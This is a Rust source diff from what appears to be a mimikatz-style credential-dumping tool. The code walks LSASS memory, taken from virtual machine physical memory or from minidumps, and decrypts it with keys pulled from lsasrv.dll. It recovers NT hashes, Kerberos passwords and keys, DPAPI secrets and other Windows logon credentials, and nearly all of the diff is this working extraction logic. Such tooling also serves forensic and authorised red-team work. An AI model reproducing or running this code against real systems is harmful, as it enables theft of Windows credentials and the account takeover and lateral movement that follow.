-                for key_group in unassigned {
-                    let target = all_creds.values_mut().find(|c| {
-                        c.kerberos.as_ref().is_some_and(|k| k.keys.is_empty())
-                    });
-                    if let Some(cred) = target {
-                        if let Some(krb) = &mut cred.kerberos {
-                            krb.keys = key_group;
-                        }
-                    }
-                }
+                status.kerberos = ProviderStatus::Ok;
+                assign_kerberos_key_groups(&mut all_creds, key_groups);
             }
         }
     }
 
-    // TsPkg
-    if let Some(ts) = &dlls.tspkg {
-        match crate::lsass::tspkg::extract_tspkg_credentials(&lsass_vmem, ts.base, ts.size, &keys) {
-            Ok(creds) => {
-                if creds.is_empty() {
-                    tspkg_status = "empty";
-                } else {
-                    tspkg_status = "ok";
-                }
-                for (luid, ts_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            ts_cred.username.clone(),
-                            ts_cred.domain.clone(),
-                        )
-                    });
-                    entry.tspkg = Some(ts_cred);
-                }
-            }
-            Err(e) => log::info!("TsPkg extraction failed: {}", e),
-        }
+    // DPAPI (DLL chain + physical scan fallback)
+    let mut dpapi_creds = extract_dpapi_from_dlls(&lsass_vmem, lsasrv, dlls.dpapisrv, &keys, Arch::X64);
+    if dpapi_creds.is_empty() {
+        log::info!("DPAPI: standard extraction found nothing, trying physical scan...");
+        dpapi_creds = crate::lsass::dpapi::extract_dpapi_physical_scan(phys, lsass.dtb, &lsass_vmem, &keys);
     }
+    status.dpapi = ProviderStatus::from_result_empty(dpapi_creds.is_empty());
+    insert_dpapi_creds(&mut all_creds, dpapi_creds);
 
-    // DPAPI (uses lsasrv.dll)
-    let dpapi_creds = match crate::lsass::dpapi::extract_dpapi_credentials(
-        &lsass_vmem,
-        lsasrv.base,
-        lsasrv.size,
-        &keys,
-    ) {
-        Ok(creds) if !creds.is_empty() => creds,
-        Ok(_) | Err(_) => {
-            log::info!("DPAPI: standard extraction found nothing, trying physical scan...");
-            crate::lsass::dpapi::extract_dpapi_physical_scan(phys, lsass.dtb, &lsass_vmem, &keys)
-        }
-    };
-    let dpapi_status = if dpapi_creds.is_empty() {
-        "empty"
-    } else {
-        "ok"
-    };
-    for (luid, dpapi_cred) in dpapi_creds {
-        let entry = all_creds
-            .entry(luid)
-            .or_insert_with(|| Credential::new_empty(luid, String::new(), String::new()));
-        entry.dpapi.push(dpapi_cred);
-    }
-
-    // Credman (uses msv1_0.dll - walks MSV logon session list for CredentialManager pointers)
-    if let Some(msv) = &dlls.msv1_0 {
-        match crate::lsass::credman::extract_credman_credentials(
-            &lsass_vmem,
-            msv.base,
-            msv.size,
-            &keys,
-        ) {
-            Ok(creds) => {
-                if creds.is_empty() {
-                    credman_status = "empty";
-                } else {
-                    credman_status = "ok";
-                }
-                for (luid, cm_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            cm_cred.username.clone(),
-                            cm_cred.domain.clone(),
-                        )
-                    });
-                    entry.credman.push(cm_cred);
-                }
-            }
-            Err(e) => log::info!("Credman extraction failed: {}", e),
-        }
-    }
-
-    // SSP (uses msv1_0.dll)
-    if let Some(msv) = &dlls.msv1_0 {
-        match crate::lsass::ssp::extract_ssp_credentials(&lsass_vmem, msv.base, msv.size, &keys) {
-            Ok(creds) => {
-                if !creds.is_empty() {
-                    ssp_status = "ok";
-                }
-                for (luid, ssp_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            ssp_cred.username.clone(),
-                            ssp_cred.domain.clone(),
-                        )
-                    });
-                    entry.ssp = Some(ssp_cred);
-                }
-            }
-            Err(e) => log::debug!("SSP extraction: {}", e),
-        }
-    }
-
-    // LiveSSP (uses livessp.dll, may not be loaded)
-    if let Some(live) = &dlls.livessp {
-        match crate::lsass::livessp::extract_livessp_credentials(
-            &lsass_vmem,
-            live.base,
-            live.size,
-            &keys,
-        ) {
-            Ok(creds) => {
-                if creds.is_empty() {
-                    livessp_status = "empty";
-                } else {
-                    livessp_status = "ok";
-                }
-                for (luid, live_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            live_cred.username.clone(),
-                            live_cred.domain.clone(),
-                        )
-                    });
-                    entry.livessp = Some(live_cred);
-                }
-            }
-            Err(e) => log::info!("LiveSSP extraction failed: {}", e),
-        }
-    } else {
-        log::info!("LiveSSP: livessp.dll not loaded in LSASS");
-    }
-
-    // CloudAP (uses cloudap.dll, may not be loaded)
-    if let Some(cap) = &dlls.cloudap {
-        match crate::lsass::cloudap::extract_cloudap_credentials(
-            &lsass_vmem,
-            cap.base,
-            cap.size,
-            &keys,
-        ) {
-            Ok(creds) => {
-                if creds.is_empty() {
-                    cloudap_status = "empty";
-                } else {
-                    cloudap_status = "ok";
-                }
-                for (luid, cap_cred) in creds {
-                    let entry = all_creds.entry(luid).or_insert_with(|| {
-                        Credential::new_empty(
-                            luid,
-                            cap_cred.username.clone(),
-                            cap_cred.domain.clone(),
-                        )
-                    });
-                    entry.cloudap = Some(cap_cred);
-                }
-            }
-            Err(e) => log::info!("CloudAP extraction failed: {}", e),
-        }
-    } else {
-        log::info!("CloudAP: cloudap.dll not loaded in LSASS");
-    }
-
-    // Print provider status summary
-    println!(
-        "[*] Providers: MSV({}) WDigest({}) Kerberos({}) TsPkg({}) DPAPI({}) SSP({}) LiveSSP({}) Credman({}) CloudAP({})",
-        msv_status, wdigest_status, kerberos_status, tspkg_status, dpapi_status,
-        ssp_status, livessp_status, credman_status, cloudap_status,
-    );
+    status.print_summary();
     #[cfg(feature = "sam")]
     if let Some(fb) = &filebacked {
         let resolved = fb.pages_resolved();
@@ -571,122 +788,56 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
         }
     }
 
-    // Merge MSV credentials with unknown LUID (0) into matching credentials by username+domain.
-    // When the credential blob has an empty domain (common for local logons), match by username only.
-    // Prefer Interactive (logon_type=2) sessions over other types.
+    // Merge MSV credentials with unknown LUID (0) into matching session
     if let Some(orphan) = all_creds.remove(&0) {
         if let Some(msv_cred) = orphan.msv {
             let cred_user = msv_cred.username.to_lowercase();
             let cred_domain = msv_cred.domain.to_lowercase();
-            let mut merged = false;
-            // Find best matching session: prefer Interactive (logon_type=2)
             let mut best_luid: Option<u64> = None;
             let mut best_logon_type: u32 = 0;
             for cred in all_creds.values() {
-                let sess_user = cred.username.to_lowercase();
-                let sess_domain = cred.domain.to_lowercase();
                 let matches = if cred_domain.is_empty() {
-                    sess_user == cred_user
+                    cred.username.to_lowercase() == cred_user
                 } else {
-                    sess_user == cred_user && sess_domain == cred_domain
+                    cred.username.to_lowercase() == cred_user && cred.domain.to_lowercase() == cred_domain
                 };
                 if matches {
-                    // Prefer Interactive (2), then any non-zero logon type, then any
-                    let priority = if cred.logon_type == 2 {
-                        3
-                    } else if cred.logon_type != 0 {
-                        2
-                    } else {
-                        1
-                    };
-                    let best_priority = if best_logon_type == 2 {
-                        3
-                    } else if best_logon_type != 0 {
-                        2
-                    } else {
-                        1
-                    };
+                    let priority = if cred.logon_type == 2 { 3 } else if cred.logon_type != 0 { 2 } else { 1 };
+                    let best_priority = if best_logon_type == 2 { 3 } else if best_logon_type != 0 { 2 } else { 1 };
                     if best_luid.is_none() || priority > best_priority {
                         best_luid = Some(cred.luid);
                         best_logon_type = cred.logon_type;
                     }
                 }
             }
+            let mut msv_opt = Some(msv_cred);
             if let Some(target_luid) = best_luid {
                 if let Some(cred) = all_creds.get_mut(&target_luid) {
-                    cred.msv = Some(msv_cred.clone());
-                    merged = true;
-                    log::debug!(
-                        "Merged MSV credential into LUID 0x{:x} (user='{}' domain='{}')",
-                        cred.luid,
-                        cred.username,
-                        cred.domain
-                    );
+                    cred.msv = msv_opt.take();
+                    log::debug!("Merged MSV credential into LUID 0x{:x}", cred.luid);
                 }
             }
-            if !merged {
-                // No matching credential found, keep as LUID=0
-                all_creds.insert(
-                    0,
-                    Credential {
-                        luid: 0,
-                        username: msv_cred.username.clone(),
-                        domain: msv_cred.domain.clone(),
-                        logon_type: 0,
-                        session_id: 0,
-                        logon_time: 0,
-                        logon_server: String::new(),
-                        sid: String::new(),
-                        msv: Some(msv_cred),
-                        wdigest: orphan.wdigest,
-                        kerberos: orphan.kerberos,
-                        tspkg: orphan.tspkg,
-                        dpapi: orphan.dpapi,
-                        credman: orphan.credman,
-                        ssp: orphan.ssp,
-                        livessp: orphan.livessp,
-                        cloudap: orphan.cloudap,
-                    },
-                );
+            if let Some(msv_cred) = msv_opt {
+                let username = msv_cred.username.clone();
+                let domain = msv_cred.domain.clone();
+                all_creds.insert(0, Credential {
+                    username, domain,
+                    msv: Some(msv_cred),
+                    wdigest: orphan.wdigest,
+                    kerberos: orphan.kerberos,
+                    tspkg: orphan.tspkg,
+                    dpapi: orphan.dpapi,
+                    credman: orphan.credman,
+                    ssp: orphan.ssp,
+                    livessp: orphan.livessp,
+                    cloudap: orphan.cloudap,
+                    ..Credential::default()
+                });
             }
         }
     }
 
-    // Fill in well-known LUID names/domains when empty
-    // (happens when session was created by DPAPI/other provider without WDigest discovery)
-    for cred in all_creds.values_mut() {
-        match cred.luid {
-            0x3e7 => {
-                if cred.username.is_empty() {
-                    cred.username = "SYSTEM".to_string();
-                }
-                if cred.domain.is_empty() {
-                    cred.domain = "NT AUTHORITY".to_string();
-                }
-            }
-            0x3e4 => {
-                if cred.username.is_empty() {
-                    cred.username = "NETWORK SERVICE".to_string();
-                }
-                if cred.domain.is_empty() {
-                    cred.domain = "NT AUTHORITY".to_string();
-                }
-            }
-            0x3e5 => {
-                if cred.username.is_empty() {
-                    cred.username = "LOCAL SERVICE".to_string();
-                }
-                if cred.domain.is_empty() {
-                    cred.domain = "NT AUTHORITY".to_string();
-                }
-            }
-            _ => {}
-        }
-    }
-
-    let mut result: Vec<Credential> = all_creds.into_values().collect();
-    result.sort_by_key(|c| c.luid);
-    Ok(result)
+    Ok(finalize_credentials(all_creds))
 }
 
 /// Scan LSASS physical pages for KIWI_MSV1_0_PRIMARY_CREDENTIALS structures.
@@ -701,7 +852,7 @@ pub fn extract_all_credentials<P: PhysicalMemory>(
 fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
     phys: &P,
     lsass_dtb: u64,
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     _msv_base: u64,
     _msv_size: u32,
     keys: &CryptoKeys,
@@ -757,38 +908,21 @@ fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
             }
 
             // Validate: next pointer at +0x00 should be 0 or a heap ptr
-            let next =
-                u64::from_le_bytes(page_data[struct_off..struct_off + 8].try_into().unwrap());
+            let Some(next) = read_u64_le(&page_data, struct_off) else { continue };
             if next != 0 && (next < 0x10000 || (next >> 48) != 0) {
                 continue;
             }
 
             // Validate: ANSI_STRING.Buffer at +0x10 should be a heap ptr
-            let buf_ptr = u64::from_le_bytes(
-                page_data[struct_off + 0x10..struct_off + 0x18]
-                    .try_into()
-                    .unwrap(),
-            );
+            let Some(buf_ptr) = read_u64_le(&page_data, struct_off + 0x10) else { continue };
             if buf_ptr < 0x10000 || (buf_ptr >> 48) != 0 {
                 continue;
             }
 
             // Validate: Credentials UNICODE_STRING at +0x18
-            let cred_len = u16::from_le_bytes(
-                page_data[struct_off + 0x18..struct_off + 0x1A]
-                    .try_into()
-                    .unwrap(),
-            ) as usize;
-            let cred_max_len = u16::from_le_bytes(
-                page_data[struct_off + 0x1A..struct_off + 0x1C]
-                    .try_into()
-                    .unwrap(),
-            ) as usize;
-            let cred_buf = u64::from_le_bytes(
-                page_data[struct_off + 0x20..struct_off + 0x28]
-                    .try_into()
-                    .unwrap(),
-            );
+            let Some(cred_len) = read_u16_le(&page_data, struct_off + 0x18).map(|v| v as usize) else { continue };
+            let Some(cred_max_len) = read_u16_le(&page_data, struct_off + 0x1A).map(|v| v as usize) else { continue };
+            let Some(cred_buf) = read_u64_le(&page_data, struct_off + 0x20) else { continue };
 
             // Encrypted credentials must be non-zero length, reasonable size, even length
             if cred_len == 0 || cred_len > 0x400 || cred_max_len < cred_len {
@@ -824,23 +958,11 @@ fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
         candidates_found
     );
 
-    // Process each candidate, deduplicating by encrypted data content
-    let mut seen_enc_data: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
-    // Track SHA1-validated variant across credentials (same LSASS → same Windows build)
+    // Process all candidates without deduplication — multiple sessions may share the
+    // same encrypted credential blob, and we need one result per session for the caller
+    // to match by username/domain. Dedup happens in the caller via `c.msv.is_none()`.
     let mut validated_variant: Option<usize> = None;
     for (vaddr, _paddr) in &cred_candidates {
-        // Deduplicate: read first 32 bytes of encrypted data and skip if already seen
-        let enc_size = vmem.read_virt_u16(*vaddr + 0x18).unwrap_or(0) as usize;
-        let enc_buf = vmem.read_virt_u64(*vaddr + 0x20).unwrap_or(0);
-        if enc_size > 0 && enc_buf > 0x10000 {
-            let sample_len = std::cmp::min(enc_size, 32);
-            if let Ok(sample) = vmem.read_virt_bytes(enc_buf, sample_len) {
-                if !seen_enc_data.insert(sample) {
-                    log::debug!("  VA 0x{:x}: duplicate encrypted content, skipping", vaddr);
-                    continue;
-                }
-            }
-        }
         // Try to verify "Primary" string
         let ansi_buf = vmem.read_virt_u64(*vaddr + 0x10).unwrap_or(0);
         if ansi_buf != 0 {
@@ -877,7 +999,7 @@ fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
                 //   +0x00: LogonDomainName (UNICODE_STRING embedded)
                 //   +0x10: UserName (UNICODE_STRING embedded)
                 // But these are inside the encrypted blob, so read from the blob
-                let (username, domain) = extract_username_from_cred_blob(vmem, *vaddr, keys);
+                let (username, domain) = crate::lsass::msv::extract_username_from_cred_blob(vmem, *vaddr, keys, Arch::X64);
 
                 log::info!(
                     "MSV credential (phys scan): user='{}' domain='{}' NT={}",
@@ -905,96 +1027,6 @@ fn scan_phys_for_msv_credentials<P: PhysicalMemory>(
     results
 }
 
-/// Extract username and domain from the decrypted MSV1_0_PRIMARY_CREDENTIAL blob.
-/// The blob starts with:
-///   +0x00: LogonDomainName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
-///   +0x10: UserName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer u64)
-///
-/// The Buffer field is an OFFSET into the decrypted blob (not a VA), because
-/// the entire credential is encrypted as a contiguous block.
-fn extract_username_from_cred_blob(
-    vmem: &impl VirtualMemory,
-    cred_struct_ptr: u64,
-    keys: &CryptoKeys,
-) -> (String, String) {
-    let enc_size = match vmem.read_virt_u16(cred_struct_ptr + 0x18) {
-        Ok(s) => s as usize,
-        Err(_) => return (String::new(), String::new()),
-    };
-    if enc_size == 0 || enc_size > 0x400 {
-        return (String::new(), String::new());
-    }
-    let enc_ptr = match vmem.read_virt_u64(cred_struct_ptr + 0x20) {
-        Ok(p) => p,
-        Err(_) => return (String::new(), String::new()),
-    };
-    if enc_ptr == 0 {
-        return (String::new(), String::new());
-    }
-    let enc_data = match vmem.read_virt_bytes(enc_ptr, enc_size) {
-        Ok(d) => d,
-        Err(_) => return (String::new(), String::new()),
-    };
-    let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
-        Ok(d) => d,
-        Err(_) => return (String::new(), String::new()),
-    };
-
-    if decrypted.len() < 0x20 {
-        return (String::new(), String::new());
-    }
-
-    // Parse UNICODE_STRINGs from decrypted blob
-    let domain_len = u16::from_le_bytes([decrypted[0], decrypted[1]]) as usize;
-    let user_len = u16::from_le_bytes([decrypted[0x10], decrypted[0x11]]) as usize;
-
-    // Buffer field: could be an offset into the blob OR a VA in LSASS
-    let domain_buf_raw = u64::from_le_bytes(decrypted[0x08..0x10].try_into().unwrap_or([0; 8]));
-    let user_buf_raw = u64::from_le_bytes(decrypted[0x18..0x20].try_into().unwrap_or([0; 8]));
-
-    // Read domain string
-    let domain = read_embedded_unicode_string(&decrypted, domain_buf_raw, domain_len, vmem);
-
-    // Read username string
-    let username = read_embedded_unicode_string(&decrypted, user_buf_raw, user_len, vmem);
-
-    (username, domain)
-}
-
-/// Read a UNICODE_STRING from either the decrypted blob (if Buffer is an offset)
-/// or from LSASS virtual memory (if Buffer is a VA).
-fn read_embedded_unicode_string(
-    blob: &[u8],
-    buf_raw: u64,
-    byte_len: usize,
-    vmem: &impl VirtualMemory,
-) -> String {
-    if byte_len == 0 || byte_len > 0x200 {
-        return String::new();
-    }
-
-    // If buf_raw is small enough to be an offset into the blob, read from blob
-    if (buf_raw as usize) + byte_len <= blob.len() {
-        let start = buf_raw as usize;
-        let data = &blob[start..start + byte_len];
-        let u16s: Vec<u16> = data
-            .chunks_exact(2)
-            .map(|c| u16::from_le_bytes([c[0], c[1]]))
-            .take_while(|&c| c != 0)
-            .collect();
-        return String::from_utf16_lossy(&u16s);
-    }
-
-    // Otherwise treat as VA in LSASS memory
-    if buf_raw > 0x10000 && (buf_raw >> 48) == 0 {
-        return vmem
-            .read_win_unicode_string_raw(buf_raw, byte_len)
-            .unwrap_or_default();
-    }
-
-    String::new()
-}
-
 /// Scan LSASS physical pages for KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607 structures.
 ///
 /// Layout:
@@ -1010,7 +1042,7 @@ fn read_embedded_unicode_string(
 fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
     phys: &P,
     lsass_dtb: u64,
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     keys: &CryptoKeys,
     known_users: &std::collections::HashSet<(String, String)>,
 ) -> Vec<(u64, KerberosCredential)> {
@@ -1041,11 +1073,10 @@ fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
         // Need at least 0x40 bytes (up to Password buffer pointer at +0x38).
         for off in (0..0x1000usize - 0x40).step_by(8) {
             // --- UserName UNICODE_STRING at +0x00 ---
-            let user_len = u16::from_le_bytes(page_data[off..off + 2].try_into().unwrap()) as usize;
-            let user_max =
-                u16::from_le_bytes(page_data[off + 2..off + 4].try_into().unwrap()) as usize;
-            let user_pad = u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
-            let user_buf = u64::from_le_bytes(page_data[off + 8..off + 16].try_into().unwrap());
+            let Some(user_len) = read_u16_le(&page_data, off).map(|v| v as usize) else { continue };
+            let Some(user_max) = read_u16_le(&page_data, off + 2).map(|v| v as usize) else { continue };
+            let Some(user_pad) = read_u32_le(&page_data, off + 4) else { continue };
+            let Some(user_buf) = read_u64_le(&page_data, off + 8) else { continue };
 
             if user_len == 0 || user_len > 100 || !user_len.is_multiple_of(2) {
                 continue;
@@ -1058,12 +1089,10 @@ fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
             }
 
             // --- DomainName UNICODE_STRING at +0x10 ---
-            let dom_len =
-                u16::from_le_bytes(page_data[off + 0x10..off + 0x12].try_into().unwrap()) as usize;
-            let dom_max =
-                u16::from_le_bytes(page_data[off + 0x12..off + 0x14].try_into().unwrap()) as usize;
-            let dom_pad = u32::from_le_bytes(page_data[off + 0x14..off + 0x18].try_into().unwrap());
-            let dom_buf = u64::from_le_bytes(page_data[off + 0x18..off + 0x20].try_into().unwrap());
+            let Some(dom_len) = read_u16_le(&page_data, off + 0x10).map(|v| v as usize) else { continue };
+            let Some(dom_max) = read_u16_le(&page_data, off + 0x12).map(|v| v as usize) else { continue };
+            let Some(dom_pad) = read_u32_le(&page_data, off + 0x14) else { continue };
+            let Some(dom_buf) = read_u64_le(&page_data, off + 0x18) else { continue };
 
             if dom_len == 0 || dom_len > 100 || !dom_len.is_multiple_of(2) {
                 continue;
@@ -1086,16 +1115,10 @@ fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
                     continue;
                 }
 
-                let pwd_len =
-                    u16::from_le_bytes(page_data[off + po..off + po + 2].try_into().unwrap())
-                        as usize;
-                let pwd_max =
-                    u16::from_le_bytes(page_data[off + po + 2..off + po + 4].try_into().unwrap())
-                        as usize;
-                let pwd_pad =
-                    u32::from_le_bytes(page_data[off + po + 4..off + po + 8].try_into().unwrap());
-                let pwd_buf =
-                    u64::from_le_bytes(page_data[off + po + 8..off + po + 16].try_into().unwrap());
+                let Some(pwd_len) = read_u16_le(&page_data, off + po).map(|v| v as usize) else { continue };
+                let Some(pwd_max) = read_u16_le(&page_data, off + po + 2).map(|v| v as usize) else { continue };
+                let Some(pwd_pad) = read_u32_le(&page_data, off + po + 4) else { continue };
+                let Some(pwd_buf) = read_u64_le(&page_data, off + po + 8) else { continue };
 
                 if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
                     continue;
@@ -1198,7 +1221,7 @@ fn scan_phys_for_kerberos_credentials<P: PhysicalMemory>(
 fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
     phys: &P,
     lsass_dtb: u64,
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     keys: &CryptoKeys,
 ) -> Vec<Vec<KerberosKey>> {
     let walker = PageTableWalker::new(phys);
@@ -1228,12 +1251,13 @@ fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
         //   +0x28: first KERB_HASHPASSWORD entry
         // Try both 1607+ and pre-1607 layouts for the first entry.
         for off in (0..0x1000usize - 0x80).step_by(8) {
-            let cb_item = u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
+            let Some(cb_item) = read_u32_le(&page_data, off + 4) else { continue };
             if cb_item == 0 || cb_item > 10 {
                 continue;
             }
 
-            // Try each layout: generic_offset within the first entry
+            // Try each layout: generic_offset within the first entry.
+            // 0x20 = KEY_ENTRY_1607.generic_offset, 0x18 = KEY_ENTRY_PRE1607.generic_offset
             for &generic_off_in_entry in &[0x20usize, 0x18] {
                 let entry_off = off + 0x28;
                 let generic_off = entry_off + generic_off_in_entry;
@@ -1241,19 +1265,17 @@ fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
                     continue;
                 }
 
-                let etype = u32::from_le_bytes(
-                    page_data[generic_off..generic_off + 4].try_into().unwrap(),
-                );
-                let key_size = u64::from_le_bytes(
-                    page_data[generic_off + 8..generic_off + 16]
-                        .try_into()
-                        .unwrap(),
-                );
-                let key_ptr = u64::from_le_bytes(
-                    page_data[generic_off + 16..generic_off + 24]
-                        .try_into()
-                        .unwrap(),
-                );
+                // KERB_HASHPASSWORD_GENERIC layout:
+                //   +0x00: etype (u32)   — encryption type (pre-1607)
+                //          OR version=2  — on Win10 1607+, etype shifts to +0x04
+                //   +0x08: key_size (u64)
+                //   +0x10: key_ptr (u64)
+                // Note: For 1607+ the version(2) at +0x00 is filtered by the etype check
+                // below, so only pre-1607 entries match in the scan phase. The actual
+                // extraction loop (below) handles both layouts via KEY_ENTRY offsets.
+                let Some(etype) = read_u32_le(&page_data, generic_off) else { continue };
+                let Some(key_size) = read_u64_le(&page_data, generic_off + 8) else { continue };
+                let Some(key_ptr) = read_u64_le(&page_data, generic_off + 16) else { continue };
 
                 let valid_etype = matches!(etype, 1 | 3 | 17 | 18 | 23 | 24);
                 if !valid_etype {
@@ -1396,14 +1418,183 @@ fn scan_phys_for_kerberos_keys<P: PhysicalMemory>(
     all_key_groups
 }
 
-fn find_module(modules: &[LoadedModule], name: &str) -> Option<LoadedModule> {
+fn find_module<'a>(modules: &'a [LoadedModule], name: &str) -> Option<&'a LoadedModule> {
     modules
         .iter()
         .find(|m| m.base_name.eq_ignore_ascii_case(name))
-        .map(|m| LoadedModule {
-            base: m.base,
-            size: m.size,
-            full_name: m.full_name.clone(),
-            base_name: m.base_name.clone(),
-        })
+}
+
+// ---------------------------------------------------------------------------
+// Minidump credential extraction (no PhysicalMemory, only VirtualMemory)
+// ---------------------------------------------------------------------------
+
+/// Extract LSASS credentials from a parsed minidump.
+///
+/// Works like [`extract_all_credentials`] but operates directly on
+/// [`VirtualMemory`] backed by minidump memory regions. When the standard
+/// MSV list walk returns empty, falls back to scanning all memory regions
+/// for Primary credential structures (similar to the physical scan fallback
+/// in `extract_all_credentials`).
+pub fn extract_credentials_from_minidump(
+    vmem: &dyn VirtualMemory,
+    modules: &[LoadedModule],
+    build_number: u32,
+    region_ranges: &[(u64, u64)],
+    arch: Arch,
+) -> Result<Vec<Credential>> {
+    let dlls = LsassDlls::from_modules(modules);
+
+    let lsasrv = dlls
+        .lsasrv
+        .ok_or_else(|| VmkatzError::ProcessNotFound("lsasrv.dll not found in minidump".to_string()))?;
+
+    // Use build number from minidump header, fallback to KUSER_SHARED_DATA
+    let effective_build = if build_number > 0 {
+        build_number
+    } else {
+        vmem.read_virt_u32(KUSER_NT_BUILD_NUMBER)
+            .map(|v| v & 0xFFFF)
+            .unwrap_or(0)
+    };
+    log::info!("Minidump: Windows build number: {}", effective_build);
+
+    // Extract crypto keys from lsasrv.dll
+    let keys = match arch {
+        Arch::X64 => crypto::extract_crypto_keys(vmem, lsasrv.base, lsasrv.size)?,
+        Arch::X86 => crypto::extract_crypto_keys_x86(vmem, lsasrv.base, lsasrv.size)?,
+    };
+
+    let mut all_creds: std::collections::HashMap<u64, Credential> =
+        std::collections::HashMap::new();
+    let mut status = ProviderStatuses::new(&dlls);
+
+    // MSV sessions + credentials (with vmem region scan fallback)
+    if let Some(msv) = &dlls.msv1_0 {
+        let mut sessions = crate::lsass::msv::extract_msv_sessions_arch(vmem, msv.base, msv.size, effective_build, arch);
+        log::info!("MSV sessions discovered: {}", sessions.len());
+        crate::lsass::msv::enrich_sessions_from_lsasrv(
+            vmem, lsasrv.base, lsasrv.size, &mut sessions, arch,
+        );
+        insert_sessions(&mut all_creds, sessions);
+
+        match crate::lsass::msv::extract_msv_credentials_arch(vmem, msv.base, msv.size, &keys, effective_build, arch) {
+            Ok(creds) if !creds.is_empty() => {
+                status.msv = ProviderStatus::Ok;
+                for (luid, msv_cred) in creds {
+                    let entry = all_creds.entry(luid).or_insert_with(|| {
+                        Credential::new_empty(luid, msv_cred.username.clone(), msv_cred.domain.clone())
+                    });
+                    entry.msv = Some(msv_cred);
+                }
+            }
+            Ok(_) | Err(_) => {
+                log::info!("MSV list walk returned empty, trying vmem region scan fallback...");
+                let scan_creds = crate::lsass::msv::scan_vmem_for_msv_credentials(vmem, region_ranges, &keys, arch);
+                if !scan_creds.is_empty() {
+                    status.msv = ProviderStatus::Ok;
+                    let mut next_synth_luid = 0x8000_0000_0000_0000u64;
+                    for (_luid, msv_cred) in scan_creds {
+                        let effective_luid = if !msv_cred.username.is_empty() {
+                            all_creds
+                                .iter()
+                                .find(|(_, c)| {
+                                    let name_match = c.username.eq_ignore_ascii_case(&msv_cred.username);
+                                    let domain_match = msv_cred.domain.is_empty()
+                                        || msv_cred.domain == "."
+                                        || c.domain.eq_ignore_ascii_case(&msv_cred.domain);
+                                    name_match && domain_match && c.msv.is_none()
+                                })
+                                .map(|(&k, _)| k)
+                                .unwrap_or_else(|| { let s = next_synth_luid; next_synth_luid += 1; s })
+                        } else {
+                            all_creds
+                                .iter()
+                                .find(|(_, c)| {
+                                    c.msv.is_none()
+                                        && c.kerberos.as_ref().is_some_and(|k| {
+                                            k.keys.iter().any(|key| key.etype == 23 && key.key.len() == 16 && key.key[..] == msv_cred.nt_hash[..])
+                                        })
+                                })
+                                .map(|(&k, _)| k)
+                                .unwrap_or_else(|| { let s = next_synth_luid; next_synth_luid += 1; s })
+                        };
+                        let entry = all_creds.entry(effective_luid).or_insert_with(|| {
+                            Credential::new_empty(effective_luid, msv_cred.username.clone(), msv_cred.domain.clone())
+                        });
+                        entry.msv = Some(msv_cred);
+                    }
+                } else {
+                    status.msv = ProviderStatus::Empty;
+                }
+            }
+        }
+    }
+
+    // Simple providers (WDigest, TsPkg, SSP, LiveSSP, Credman, CloudAP)
+    extract_simple_providers(vmem, &dlls, &keys, arch, &mut all_creds, &mut status);
+
+    // Kerberos (with vmem scan + key scan fallbacks, x64 only)
+    if let Some(krb) = &dlls.kerberos {
+        let krb_creds = match crate::lsass::kerberos::extract_kerberos_credentials_arch(
+            vmem, krb.base, krb.size, &keys, arch,
+        ) {
+            Ok(creds) if !creds.is_empty() => creds,
+            Ok(_) | Err(_) => {
+                if arch == Arch::X64 {
+                    log::info!("Kerberos: AVL table walk found nothing, trying vmem scan fallback...");
+                    let known_sessions: std::collections::HashMap<u64, (String, String)> = all_creds
+                        .iter()
+                        .map(|(&luid, c)| (luid, (c.username.clone(), c.domain.clone())))
+                        .collect();
+                    crate::lsass::kerberos::scan_vmem_for_kerberos_credentials(vmem, region_ranges, &keys, &known_sessions)
+                } else {
+                    log::info!("Kerberos: AVL table walk found nothing (vmem scan not available for x86)");
+                    Vec::new()
+                }
+            }
+        };
+        let has_keys = krb_creds.iter().any(|(_, k)| !k.keys.is_empty());
+        if !krb_creds.is_empty() {
+            status.kerberos = ProviderStatus::Ok;
+        }
+        for (luid, krb_cred) in krb_creds {
+            let effective_luid = if luid == 0 {
+                all_creds
+                    .iter()
+                    .find(|(_, c)| {
+                        c.username.eq_ignore_ascii_case(&krb_cred.username)
+                            && c.domain.eq_ignore_ascii_case(&krb_cred.domain)
+                            && c.kerberos.is_none()
+                    })
+                    .map(|(&k, _)| k)
+                    .unwrap_or(luid)
+            } else {
+                luid
+            };
+            let entry = all_creds.entry(effective_luid).or_insert_with(|| {
+                Credential::new_empty(effective_luid, krb_cred.username.clone(), krb_cred.domain.clone())
+            });
+            entry.kerberos = Some(krb_cred);
+        }
+
+        if !has_keys && arch == Arch::X64 {
+            let key_groups = crate::lsass::kerberos::scan_vmem_for_kerberos_keys(vmem, region_ranges, &keys);
+            if !key_groups.is_empty() {
+                status.kerberos = ProviderStatus::Ok;
+                assign_kerberos_key_groups(&mut all_creds, key_groups);
+            }
+        }
+    }
+
